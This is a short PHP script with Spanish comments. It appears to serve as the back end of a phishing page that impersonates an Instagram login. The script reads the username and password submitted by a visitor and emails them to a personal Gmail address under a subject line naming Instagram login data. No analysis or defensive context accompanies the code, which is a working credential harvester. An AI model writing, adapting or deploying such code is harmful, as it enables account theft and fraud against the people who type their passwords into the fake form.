<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Configuración del correo electrónico
    $to = 'emanuelromerocr@gmail.com';
    $subject = 'Datos de inicio de sesión de Instagram';
    $message = "Usuario: $username\nContraseña: $password";
    $headers = 'From: no-reply@tudominio.com' . "\r\n" .
               'Reply-To: no-reply@tudominio.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Envío del correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        echo 'Correo enviado correctamente.';
    } else {
        echo 'Hubo un problema al enviar el correo.';
    }
}
?>
